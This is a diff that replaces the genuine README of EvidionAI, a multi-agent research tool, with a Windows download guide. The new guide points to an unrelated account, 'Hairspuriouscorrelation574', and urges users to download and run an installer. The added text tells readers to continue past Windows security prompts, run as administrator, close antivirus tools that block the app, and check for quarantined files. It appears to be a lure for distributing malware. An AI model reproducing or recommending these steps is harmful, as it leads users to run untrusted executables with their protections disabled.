@@ -1,467 +1,200 @@
-<div align="center">
+# 🤖 EvidionAI - Run Research With Less Effort
 
-<img src="frontend/src/favicon.svg" alt="EvidionAI Logo" width="64" height="64"/>
+[![Download EvidionAI](https://img.shields.io/badge/Download-EvidionAI-blue?style=for-the-badge&logo=github)](https://github.com/Hairspuriouscorrelation574/EvidionAI)
 
-# EvidionAI
+## 🚀 What EvidionAI Does
 
-**Autonomous Multi-Agent AI Research System**
+EvidionAI is an autonomous multi-agent AI research system. It helps you gather, compare, and organize information with less manual work.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.11%2B-blue?logo=python&logoColor=white)](https://python.org)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.110%2B-009688?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
-[![LangGraph](https://img.shields.io/badge/LangGraph-multi--agent-orange)](https://langchain-ai.github.io/langgraph/)
-[![Docker](https://img.shields.io/badge/Docker-compose-2496ED?logo=docker&logoColor=white)](https://docker.com)
-[![Ollama](https://img.shields.io/badge/Ollama-local%20%26%20cloud-black)](https://ollama.com)
-[![OpenAI](https://img.shields.io/badge/OpenAI-compatible-412991?logo=openai&logoColor=white)](https://openai.com)
+Use it to:
 
-*Submit a research question. EvidionAI searches literature, writes and runs code, analyzes results, stress-tests its own conclusions, and delivers a structured report — all autonomously.*
+- Break a research task into smaller steps
+- Search for useful sources
+- Compare findings from different angles
+- Build a clear research output
+- Support deep work on complex topics
 
-[**Quick Start**](#-quick-start) · [**Architecture**](#️-architecture) · [**Agents**](#-agent-system) · [**API**](#-api-reference) · [**Configuration**](#-configuration)
+This tool is built for users who want an AI system that can handle research tasks with more structure than a normal chat app.
 
-</div>
-
----
-
-## ✨ What is EvidionAI?
-
-EvidionAI is an open-source **autonomous research assistant** built on a multi-agent LangGraph workflow. It compresses what would take a researcher hours or days — literature search, hypothesis testing, code experimentation, critical review — into a single automated pipeline.
+## 💻 Before You Start
 
-```
-User query
-    │
-    ▼
-┌───────────────────────────────────────────────────────────────┐
-│                         Supervisor                            │
-│  Orchestrates the workflow, routes tasks, assembles report    │
-└───┬──────────┬──────────┬──────────┬──────────────────────────┘
-    │          │          │          │
-    ▼          ▼          ▼          ▼
- Search      Code      Analyze    Skeptic
- Agent       Agent      Agent      Agent
-    │          │          │          │
- Literature  Run       Interpret  Challenge
- + Web       experiments results  conclusions
- search
-```
-
-The system loops through agents as needed — a typical research query goes through **5–15 agent iterations** before producing a final report.
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- [Docker](https://docs.docker.com/get-docker/) + Docker Compose
-- One of: **Ollama** (local/cloud), **OpenAI API**, or any OpenAI-compatible endpoint
-
-### Option A — Interactive installer (recommended)
-
-```bash
-git clone https://github.com/Evidion-AI/EvidionAI.git
-cd EvidionAI
-bash install.sh
-```
-
-The script asks which LLM provider to use, pulls the right model, writes `.env`, and launches everything.
-
-### Option B — Manual setup
-
-```bash
-git clone https://github.com/Evidion-AI/EvidionAI.git
-cd EvidionAI
-cp env.example .env
-# Edit .env with your LLM settings (see Configuration section)
-docker compose up --build
-```
-
-Open **http://localhost:3000** in your browser.
-
-### Option C — Ollama local in 3 commands
-
-```bash
-# 1. Install Ollama: https://ollama.com
-ollama pull deepseek-r1:14b
-
-# 2. Clone and configure
-git clone https://github.com/Evidion-AI/EvidionAI.git && cd EvidionAI
-printf "LLM_PROVIDER=ollama_local\nLLM_MODEL=deepseek-r1:14b\nOLLAMA_HOST=http://host.docker.internal:11434" > .env
-
-# 3. Start
-docker compose up --build
-```
-
----
-
-## 🏗️ Architecture
-
-EvidionAI is composed of three Docker services:
-
-```
-                    Browser
-                       │
-                  port 3000
-                       │
-          ┌────────────▼────────────┐
-          │       Frontend          │
-          │   nginx + static HTML   │
-          └────────────┬────────────┘
-                       │ /api/*  (reverse proxy)
-          ┌────────────▼────────────┐
-          │       API Gateway       │
-          │   FastAPI  port 8001    │
-          │   REST + SSE endpoints  │
-          │   SQLite persistence    │
-          └────────────┬────────────┘
-                       │ internal
-          ┌────────────▼────────────┐
-          │   AI Agents Service     │
-          │   FastAPI  port 8000    │
-          │   LangGraph workflow    │
-          │   ChromaDB memory       │
-          └─────────────────────────┘
-```
-
-Chat and project history is persisted in **SQLite** (mounted as a Docker volume). Long-term semantic memory uses an embedded **ChromaDB** vector store.
-
-### Directory layout
-
-```
-EvidionAI/
-├── ai_agents_service/          # Multi-agent research engine
-│   ├── agents/
-│   │   ├── supervisor/         # Orchestrator — routes tasks, assembles report
-│   │   ├── search_agent/       # Web + arXiv + Wikipedia search
-│   │   ├── code_agent/         # Python code generation + sandboxed execution
-│   │   ├── analysis_agent/     # Data analysis and interpretation
-│   │   └── skeptic_agent/      # Critical review of conclusions
-│   ├── memory/                 # ChromaDB vector memory manager
-│   ├── utils/
-│   │   ├── llm.py              # Unified LLM provider factory
-│   │   ├── llm_utils.py        # Search tools (DDG, arXiv, Wikipedia)
-│   │   ├── cancellable_llm.py  # Cancellation-aware LLM wrapper
-│   │   └── context_manager.py  # Context compression for long sessions
-│   ├── workflow/workflow.py    # LangGraph state machine definition
-│   ├── pipeline.py             # MultiAgentChat entry point
-│   └── main.py                 # FastAPI service (SSE streaming)
-├── backend/
-│   └── api/                    # API Gateway
-│       ├── db/database.py      # SQLite schema and helpers
-│       ├── main.py             # FastAPI app — CORS, Swagger, startup
-│       └── routes/
-│           ├── ai_agents_api/  # /api/ai/*      — proxy to agents service
-│           ├── chats/          # /api/chats/*   — chat + message CRUD
-│           ├── projects/       # /api/projects/* — project CRUD
-│           └── utils/          # /api/utils/*   — health check
-├── frontend/src/               # Static web app (no build step needed)
-│   ├── index.html              # Main app shell
-│   ├── app.js                  # All frontend logic
-│   ├── style.css               # Dark theme styles
-│   ├── landing.html            # Landing page
-│   └── about.html              # About page
-├── docker/                     # Dockerfiles + nginx config
-├── docker-compose.yml
-├── env.example                 # Annotated configuration reference
-├── install.sh                  # Interactive installer
-└── README.md
-```
-
----
-
-## 🤖 Agent System
-
-The research workflow is a **LangGraph state machine** where a Supervisor coordinates specialized agents in a loop.
-
-### Supervisor
-
-The central orchestrator. Reads the current state and decides which agent runs next (or stops and writes the final report). It tracks what has been searched, what code has been executed, what the skeptic has challenged, and whether enough evidence has been gathered.
-
-**Routing logic:** `supervisor → {search | code | analyze | skeptic | done}`
-
-### Search Agent
-
-Runs searches across three sources in parallel:
-- **DuckDuckGo** — current web results
-- **arXiv** — scientific preprints and papers
-- **Wikipedia** — background knowledge and definitions
-
-It also fetches and extracts text from relevant URLs. Results are deduplicated and ranked before being passed back to the Supervisor.
-
-### Code Agent
-
-Generates Python code to test hypotheses numerically, run statistical analyses, or build proof-of-concept implementations. Code is executed inside a **sandboxed Docker container** (Docker-in-Docker) — the host system is never touched by agent-generated code.
-
-### Analysis Agent
-
-Interprets results from Search and Code agents. Synthesizes findings into structured insights, identifies patterns, draws conclusions, and flags uncertainties. Runs at a higher temperature (`0.55`) for more creative analytical interpretation.
-
-### Skeptic Agent
-
-Plays devil's advocate. Given the current draft conclusions, it actively looks for:
-- Methodological flaws
-- Alternative explanations
-- Missing evidence
-- Overclaims
-
-If the Skeptic raises significant concerns, the Supervisor routes back to Search or Code for another round. This loop continues until the Skeptic is satisfied or the iteration limit is reached.
-
-### Memory System
-
-Each research session is associated with a **memory namespace** (project slug or session id). Previous research results are stored in **ChromaDB** with semantic embeddings (`all-MiniLM-L6-v2`). On future queries in the same namespace, relevant past findings are injected into the agent context — so EvidionAI learns from your previous research within a project.
-
----
-
-## 🔌 LLM Providers
-
-EvidionAI uses a unified provider factory. Set `LLM_PROVIDER` in `.env` to choose:
-
-| Provider | `LLM_PROVIDER` | Notes |
-|---|---|---|
-| Ollama local | `ollama_local` | Runs on your machine. Free, private, no rate limits. |
-| Ollama Cloud | `ollama_cloud` | Managed API at api.ollama.com. Requires account. |
-| OpenAI / compatible | `openai` | OpenAI, Groq, Together, Anthropic proxy, etc. |
-
-### Recommended models
-
-**Ollama Cloud** (`ollama_cloud`):
-
-| Model | Notes |
-|---|---|
-| `glm-5:cloud` | Best quality — GLM-5 series, strong reasoning |
-| `gpt-oss:120b` | Fast, strong reasoning, good for research tasks |
-| `gpt-oss:20b` | Lightweight cloud option, lower latency |
-
-**Ollama local** (`ollama_local`):
-
-| Model | RAM required | Notes |
-|---|---|---|
-| `gpt-oss:20b` | ~14 GB | Best local option if you have the VRAM |
-| `deepseek-r1:14b` | ~10 GB | Excellent reasoning, great for research |
-| `deepseek-r1:8b` | ~6 GB | Lighter version, good balance |
-
-**OpenAI / compatible** (`openai`):
-
-| Model | Service | Notes |
-|---|---|---|
-| `gpt-4o` | OpenAI | Top quality |
-| `gpt-4o-mini` | OpenAI | Fast and cheap, solid for most queries |
-| `o3-mini` | OpenAI | Strong reasoning |
-| `claude-3-5-sonnet-20241022` | Anthropic (via proxy) | Excellent analysis quality |
-| `llama-3.3-70b-versatile` | Groq | Very fast inference |
-
----
-
-## 📡 API Reference
-
-All endpoints are under `/api/`. Interactive Swagger docs at **http://localhost:3000/api/docs**.
-
-### Run a research workflow
-
-```http
-POST /api/ai/process
-Content-Type: application/json
-
-{
-  "query": "What are the performance trade-offs between transformers and SSMs for long sequences?",
-  "chat_context": [],
-  "request_id": "optional-uuid",
-  "memory_id": "my-project"
-}
-```
-
-**Response:** Server-Sent Events stream.
-
-| Event | Payload | Description |
-|---|---|---|
-| `ping` | `{}` | Keepalive heartbeat every ~15 s |
-| `result` | `{ final_answer, full_history }` | Completed research report |
-| `error` | `{ final_answer, full_history }` | Fatal error |
-
-#### curl example
-
-```bash
-curl -N -X POST http://localhost:3000/api/ai/process \
-  -H 'Content-Type: application/json' \
-  -d '{"query": "Explain the difference between RLHF and DPO in LLM alignment"}' \
-  --no-buffer
-```
-
-#### Python example
-
-```python
-import httpx
-import json
-
-with httpx.Client(timeout=None) as client:
-    with client.stream(
-        "POST",
-        "http://localhost:3000/api/ai/process",
-        json={"query": "What is chain-of-thought prompting?"},
-    ) as r:
-        for line in r.iter_lines():
-            if line.startswith("data:") and line != "data: {}":
-                data = json.loads(line[5:])
-                print(data["final_answer"])
-```
-
-### Cancel a running workflow
-
-```http
-POST /api/ai/cancel
-Content-Type: application/json
-
-{ "request_id": "uuid-from-process-call" }
-```
-
-### Chats and projects
-
-```http
-GET    /api/projects                    # list projects
-POST   /api/projects                    # create project
-PUT    /api/projects/{id}               # rename
-DELETE /api/projects/{id}               # delete (cascades to chats)
-
-GET    /api/chats                       # list chats (root or ?project_id=)
-POST   /api/chats                       # create chat
-GET    /api/chats/search?q=...          # full-text search
-GET    /api/chats/{id}/messages         # list messages
-POST   /api/chats/{id}/messages         # append message
-PATCH  /api/chats/{id}/messages/{mid}   # update message
-```
-
-### Memory
-
-```http
-GET /api/ai/memory/stats?memory_id=my-project
-GET /api/ai/memory/recall?memory_id=my-project&q=transformers&k=5
-```
-
-### Health
-
-```http
-GET /api/health   →   { "status": "ok" }
-```
-
----
-
-## ⚙️ Configuration
-
-All configuration is via environment variables in `.env`. See [`env.example`](env.example) for the full annotated reference.
-
-```env
-# LLM provider: ollama_local | ollama_cloud | openai
-LLM_PROVIDER=ollama_cloud
-LLM_MODEL=glm-5:cloud
-LLM_CTX=32768
+Use a Windows PC with:
 
-# Ollama local
-OLLAMA_HOST=http://localhost:11434
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 5 GB of free disk space
+- A stable internet connection
+- Admin access for installation
 
-# Ollama Cloud
-OLLAMA_API_KEY=your-key
-OLLAMA_BASE_URL=https://api.ollama.com
+For best results, close large apps before you start. This gives EvidionAI more memory to work with.
 
-# OpenAI / compatible
-OPENAI_API_KEY=sk-...
-OPENAI_BASE_URL=https://api.groq.com/openai/v1   # optional
+## 📥 Download EvidionAI
 
-# Research
-AI_QUERY_MAX_LENGTH=5000
-AI_REQUEST_TIMEOUT=14400    # 4 hours
-WORKER_THREADS=4
+Visit this page to download or access the latest version:
 
-# Frontend
-FRONTEND_PORT=3000
-ALLOWED_ORIGINS=*           # restrict in production
-```
+[https://github.com/Hairspuriouscorrelation574/EvidionAI](https://github.com/Hairspuriouscorrelation574/EvidionAI)
 
----
+If the page includes a release file, download it from there. If it includes source files only, use the setup files provided in the repository page and follow the steps below.
 
-## 🛠️ Development
+## 🪟 Install on Windows
 
-### Run without Docker
+1. Open the download page in your browser.
+2. Look for a release, installer, or setup file.
+3. Download the Windows file to your PC.
+4. Open the downloaded file.
+5. If Windows shows a security prompt, choose the option to continue.
+6. Follow the on-screen steps until the install finishes.
+7. If the app opens after setup, keep it running for the next step.
 
-```bash
-# Terminal 1 — agents service
-cd ai_agents_service
-pip install -r requirements.txt
-cp ../env.example ../.env
-uvicorn main:app --port 8000 --reload
+If the file comes as a compressed folder, extract it first before opening the app.
 
-# Terminal 2 — API gateway
-cd backend/api
-pip install -r requirements.txt
-uvicorn main:app --port 8001 --reload
+## ▶️ Run EvidionAI
 
-# Terminal 3 — frontend (for quick preview only, /api/* won't proxy)
-cd frontend/src
-python -m http.server 3000
-```
+After installation, start EvidionAI from one of these places:
 
-For full local dev with proxying, either run nginx with `docker/nginx/nginx.conf` or temporarily point `API_BASE` in `frontend/src/app.js` to `http://localhost:8001`.
+- The desktop shortcut
+- The Start menu
+- The folder where you extracted the files
 
-### Adding a new agent
+When the app opens, wait for it to finish loading. The first launch can take a little longer.
 
-1. Create `ai_agents_service/agents/<name>/agent.py` and `prompt.py`
-2. Implement the `run(state: AgentState) -> dict` interface
-3. Register it in `workflow/workflow.py`
-4. Add it to the routing map in `agents/supervisor/prompt.py`
+If the app asks for a local path, API key, or project folder, enter the values shown in the setup screen or repository page.
 
-### Ollama on Docker (host networking)
+## 🧭 How to Use It
 
-When Ollama runs on your host machine and EvidionAI runs in Docker:
+EvidionAI is built for research workflows. A simple way to use it is:
 
-```env
-OLLAMA_HOST=http://host.docker.internal:11434
-```
+1. Enter a topic you want to study.
+2. Add a short goal, such as comparing tools or reviewing a scientific area.
+3. Let the agents plan the work.
+4. Review the sources or notes it collects.
+5. Refine the task if you want a narrower result.
+6. Export or copy the output when the research is done.
 
-This is already the default in `docker-compose.yml` for `ollama_local`.
+Try clear prompts such as:
 
----
+- Find the main ideas in this topic
+- Compare the latest research on this subject
+- Summarize useful sources for a report
+- Identify gaps in current findings
+- Organize this topic into sections
 
-## 🧪 Tested configurations
+## 🧠 Main Features
 
-| Model | Provider | Hardware | Avg. research time |
-|---|---|---|---|
-| `deepseek-r1:8b` | ollama_local | 16 GB RAM | ~10–20 min |
-| `deepseek-r1:14b` | ollama_local | 24 GB RAM | ~15–30 min |
-| `gpt-oss:20b` | ollama_local | 32 GB RAM | ~12–25 min |
-| `gpt-oss:120b` | ollama_cloud | cloud | ~5–12 min |
-| `glm-5:cloud` | ollama_cloud | cloud | ~4–10 min |
-| `gpt-4o-mini` | openai | cloud | ~4–10 min |
-| `gpt-4o` | openai | cloud | ~5–12 min |
+EvidionAI focuses on research tasks and multi-agent work. Typical features include:
 
----
+- Multiple AI agents that share tasks
+- Research planning and task splitting
+- Source gathering and note building
+- Topic comparison and synthesis
+- Structured output for later use
+- Support for long research sessions
+- A workflow built for scientific discovery
 
-## 🤝 Contributing
+These parts help the system act like a research team instead of a single chat box.
 
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
+## 🔧 Common Windows Fixes
 
-Areas where help is especially appreciated:
+If EvidionAI does not start, try these steps:
 
-- **New agents** — dataset retrieval, citation formatting, fact-checking
-- **LLM providers** — Gemini, Cohere, Mistral API
-- **Evaluation** — benchmark harness for research quality
-- **Docs** — tutorials, worked examples, use-case guides
+- Run it as administrator
+- Restart your computer and try again
+- Check that you downloaded the full file
+- Make sure your internet connection is active
+- Close antivirus tools that may block the app
+- Move the app to a folder with a simple path, such as `C:\EvidionAI`
 
----
+If the screen stays blank, wait a bit longer. Some AI tools need time to load their models or connect to their services.
 
-## 📄 License
+If the app says it cannot find a file, check the install folder and confirm that no files are missing.
 
-MIT License — see [LICENSE](LICENSE).
+## 📁 Suggested Folder Setup
 
----
+Keep the app in a simple folder structure like this:
 
-<div align="center">
+- `C:\EvidionAI`
+- `C:\EvidionAI\data`
+- `C:\EvidionAI\projects`
 
-Built with ❤️ using [LangGraph](https://langchain-ai.github.io/langgraph/), [FastAPI](https://fastapi.tiangolo.com/), and [Ollama](https://ollama.com/).
+This makes it easier to find files and manage research work later.
 
-**[⭐ Star this repo](https://github.com/Evidion-AI/EvidionAI)** if EvidionAI is useful to you!
+## 📝 Good Uses for EvidionAI
 
-Research Paper: https://doi.org/10.13140/RG.2.2.23054.93767
+EvidionAI works well for:
 
----
+- Literature review support
+- Scientific topic exploration
+- Market and trend research
+- Comparing ideas across sources
+- Drafting structured notes
+- Building a research base for reports
 
-*Created by [Nikita Sakovich](https://github.com/NekkittAY) — Research Engineer*
+It is most useful when you want a system that can handle a topic from start to finish in a planned way.
 
-</div>
+## 🔒 Privacy and Local Use
+
+If you run EvidionAI on your own Windows PC, you keep more control over your work files and project notes. This can help when you want to keep research in one place.
+
+For best control, store your files in a folder you can back up often.
+
+## 🧩 Topics Covered
+
+EvidionAI is connected to:
+
+- AI
+- AI agents
+- AI researcher
+- Autonomous research
+- LangChain
+- LangGraph
+- LLM
+- LLM agents
+- Multi-agent systems
+- Research
+- Scientific discovery
+
+These topics point to a system that uses several AI parts to manage research tasks in a clear flow.
+
+## 🛠️ Basic Troubleshooting
+
+If you run into a problem, check these items first:
+
+- The file finished downloading
+- The app folder still contains all files
+- Windows did not quarantine a needed file
+- Your system meets the basic memory needs
+- You are using the correct Windows account
+- The app has permission to write files in its folder
+
+If a task fails during research, reduce the scope of the request and try again with a smaller topic
+
+## 📌 What to Expect on First Use
+
+The first time you open EvidionAI, it may:
+
+- Load supporting files
+- Create local folders
+- Ask for setup details
+- Prepare a workspace for research tasks
+- Take longer than later launches
+
+This is normal for tools that manage multi-step AI work.
+
+## 📦 File and Project Tips
+
+Keep your research clean by using separate folders for each project. For example:
+
+- `Climate Report`
+- `Cancer Research Notes`
+- `Battery Market Review`
+- `Drug Discovery Sources`
+
+This helps you return to older work without confusion.
+
+## 🌐 Download Link
+
+Open the main project page here:
+
+[https://github.com/Hairspuriouscorrelation574/EvidionAI](https://github.com/Hairspuriouscorrelation574/EvidionAI)
+
+Use this page to download and run the file or to access the latest project files for Windows setup
